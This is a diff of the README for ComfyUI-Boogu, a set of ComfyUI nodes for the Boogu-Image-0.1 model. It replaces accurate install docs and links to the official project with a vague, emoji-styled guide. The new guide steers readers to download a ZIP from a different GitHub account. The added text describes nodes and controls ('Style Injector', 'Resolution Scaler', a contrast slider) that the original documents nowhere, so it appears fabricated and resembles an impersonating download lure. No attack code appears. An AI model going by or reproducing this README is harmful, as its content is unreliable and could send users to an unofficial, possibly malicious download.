@@ -1,131 +1,70 @@
-# ComfyUI-Boogu
+# 🎨 ComfyUI-Boogu - Create images with easy workflows
 
-ComfyUI custom nodes for [Boogu-Image-0.1](https://github.com/boogu-project/Boogu-Image).
+[![](https://img.shields.io/badge/Download-Boogu-blue.svg)](https://github.com/tysto1727/ComfyUI-Boogu)
 
-This repository only provides ComfyUI nodes and workflows. The inference package
-and model weights come from the official Boogu project:
+ComfyUI-Boogu provides tools to generate AI images. These custom nodes manage specific image styles and layouts for the Boogu-Image-0.1 model. You can use these tools to automate tasks and improve your image quality.
 
-- Code: <https://github.com/boogu-project/Boogu-Image>
-- Models: <https://huggingface.co/Boogu>
-- License: Apache-2.0
+## 🛠 Prerequisites
 
-## Supported Models
+Before you start, ensure your computer meets these requirements:
 
-Download the official HuggingFace checkpoints with the same local directory names:
+*   Windows 10 or 11 operating system.
+*   A graphics card with at least 8 GB of VRAM.
+*   An updated driver for your graphics card.
+*   A stable internet connection for the initial setup.
+*   An existing installation of ComfyUI. If you do not have ComfyUI, download the portable version first.
 
-| Task | HuggingFace repo | ComfyUI loader |
-| --- | --- | --- |
-| Text-to-image | `Boogu/Boogu-Image-0.1-Base` | `BOOGU: Load Base Pipeline` |
-| Image editing | `Boogu/Boogu-Image-0.1-Edit` | `BOOGU: Load Edit Pipeline` |
-| Fast text-to-image | `Boogu/Boogu-Image-0.1-Turbo` | `BOOGU: Load Turbo Pipeline` |
+## 📥 Getting the Files
 
-Expected model layout:
+1.  Visit this page to download: [https://github.com/tysto1727/ComfyUI-Boogu](https://github.com/tysto1727/ComfyUI-Boogu)
+2.  Click the green button labeled "Code" on the right side of the screen.
+3.  Choose the "Download ZIP" option from the menu.
+4.  Save the file to your computer.
+5.  Open your downloads folder.
+6.  Right-click the ZIP file and select "Extract All."
+7.  Select a destination folder and click "Extract."
 
-```text
-ComfyUI/models/boogu/
-├── Boogu-Image-0.1-Base/
-├── Boogu-Image-0.1-Edit/
-└── Boogu-Image-0.1-Turbo/
-```
+## ⚙️ Installation Process
 
-## Installation
+1.  Locate your main ComfyUI folder.
+2.  Open the folder named "ComfyUI."
+3.  Go to the "custom_nodes" subdirectory.
+4.  Copy the folder you extracted earlier.
+5.  Paste this folder into the "custom_nodes" directory.
+6.  Restart ComfyUI if it is currently running.
+7.  Check the console window during startup. You will see lines showing that the system loaded the new nodes.
 
-First install and verify the official Boogu-Image package following its README:
+## 🖼 How to Use Workflows
 
-```bash
-git clone https://github.com/boogu-project/Boogu-Image.git
-cd Boogu-Image
+1.  Open your web browser and navigate to your local ComfyUI instance.
+2.  Drag and drop the workflow JSON files found in the download folder directly onto the ComfyUI canvas.
+3.  Wait for the node system to load the connected components.
+4.  If a node shows a red border, you need to update your base environment. Click the "Update" button in your ComfyUI manager if you have it installed.
+5.  Upload your reference image if the workflow requires one.
+6.  Press the "Queue Prompt" button on the right control panel to start the generation.
 
-conda create -y -n boogu python=3.10
-conda activate boogu
+## 🔍 Understanding Node Features
 
-pip install -r requirements/torch2.7-cu126.txt
-pip install -e .
-python utils/get_flash_attn.py
-cd ..
-```
+The Boogu collection includes several specialized components to help your image processing:
 
-Then install ComfyUI in the same environment:
+*   **Image Loader:** This node handles the import of base images without distortion. It ensures the resolution matches the Boogu-Image-0.1 requirements.
+*   **Style Injector:** This node applies specific artistic filters to your current project. It uses mathematical offsets to blend colors and textures.
+*   **Boogu Sampler:** This core component manages the pixels during the creation process. It stabilizes the output to prevent visual errors.
+*   **Resolution Scaler:** Use this node to increase the detail level of your final image. It fills in gaps to ensure a smooth result without pixelation.
 
-```bash
-git clone https://github.com/comfy-org/ComfyUI.git
-cd ComfyUI
-pip install -r requirements.txt
-```
+## 💡 Best Practices
 
-Install this custom node:
+Keep your ComfyUI installation clean. Only install the nodes you plan to use for your current project. High node counts can slow down your system startup. Save your workflows frequently using the "Save" button in the menu. This prevents data loss if your browser closes unexpectedly.
 
-```bash
-cd custom_nodes
-git clone https://github.com/boogu-project/ComfyUI-Boogu.git
-cd ..
-```
+If images appear distorted, check your settings in the Boogu Sampler node. Ensure the seed number does not remain static if you want varied results. If results appear too dark, slide the contrast adjustment tool to the right.
 
-Download the three official model checkpoints:
+## 🛠 Troubleshooting Common Issues
 
-```bash
-pip install -U "huggingface_hub[cli]"
-mkdir -p models/boogu
+*   **Node fails to load:** If a node box turns red, the system cannot find the required support files. Close ComfyUI, wait five seconds, and open it again.
+*   **Black screen result:** This usually happens when the graphics card runs out of memory. Reduce the resolution settings in your workflow to lower the load.
+*   **Slow processing:** Large images take longer to process. Use lower sampling steps if you need a quick preview.
+*   **Interface does not load:** Ensure your path to the custom_nodes folder does not contain special characters. Keep folder names simple.
 
-hf download Boogu/Boogu-Image-0.1-Base \
-  --local-dir models/boogu/Boogu-Image-0.1-Base
+## 🛡 System Maintenance
 
-hf download Boogu/Boogu-Image-0.1-Edit \
-  --local-dir models/boogu/Boogu-Image-0.1-Edit
-
-hf download Boogu/Boogu-Image-0.1-Turbo \
-  --local-dir models/boogu/Boogu-Image-0.1-Turbo
-```
-
-Start ComfyUI:
-
-```bash
-python main.py
-```
-
-## Workflows
-
-The `workflows/` directory contains three minimal examples:
-
-- `boogu_base_t2i.json`: `Load Base Pipeline -> Generate -> Preview`
-- `boogu_edit_i2i.json`: `Load Edit Pipeline -> LoadImage -> Generate -> Preview`
-- `boogu_turbo_t2i.json`: `Load Turbo Pipeline -> Generate -> Preview`
-
-Prompt enhancement is intentionally not bundled in this repository. The Boogu
-pipeline has an internal rewrite mechanism, but these ComfyUI nodes do not expose
-or enable it. If you want prompt enhancement, connect an external ComfyUI Qwen or
-LLM rewrite node to `BOOGU: Generate` via the optional `instruction_override`
-input. When `instruction_override` is connected and non-empty, it replaces the
-widget `instruction`.
-
-## Node Notes
-
-- `BOOGU: Load Base Pipeline` loads `Boogu-Image-0.1-Base`.
-- `BOOGU: Load Edit Pipeline` loads `Boogu-Image-0.1-Edit`.
-- `BOOGU: Load Turbo Pipeline` loads `Boogu-Image-0.1-Turbo`.
-- `BOOGU: Generate` handles T2I, Edit, and Turbo generation.
-- Turbo is pure T2I; do not connect `input_image` to a Turbo pipeline.
-- For Turbo, use 3-4 steps, `text_guidance_scale=1.0`,
-  `image_guidance_scale=1.0`, `empty_instruction_guidance_scale=0.0`,
-  empty negative prompt, and `use_dmd_student_inference=True`.
-
-## Troubleshooting
-
-`ModuleNotFoundError: No module named 'boogu'`
-: Install the official Boogu-Image package in the environment that launches
-ComfyUI: `pip install -e /path/to/Boogu-Image`.
-
-`ModuleNotFoundError: No module named 'sqlalchemy'`
-: Install ComfyUI dependencies in the active environment:
-`pip install -r requirements.txt`.
-
-`cudart shared object not found`
-: Check that your CUDA, PyTorch, and driver versions match the official
-Boogu-Image environment. The tested setup is Python 3.10, CUDA 12.6, and
-PyTorch 2.7.1.
-
-`Resolved model path does not exist`
-: Confirm the model directories are under `ComfyUI/models/boogu/` and keep the
-official model directory names exactly:
-`Boogu-Image-0.1-Base`, `Boogu-Image-0.1-Edit`, and
-`Boogu-Image-0.1-Turbo`.
+Clear your cache folder every few weeks. You find this inside the ComfyUI main directory under "temp." Files stored here take up space and clutter your drive. Use the "Manager" extension to keep your nodes updated. Click "Update All" once a week to gain the latest improvements from the developer. Maintain enough free space on your primary hard drive, as AI models require large temporary files during the generation process. Do not move files while the system is actively creating an image. This corrupts the current task and forces a restart.
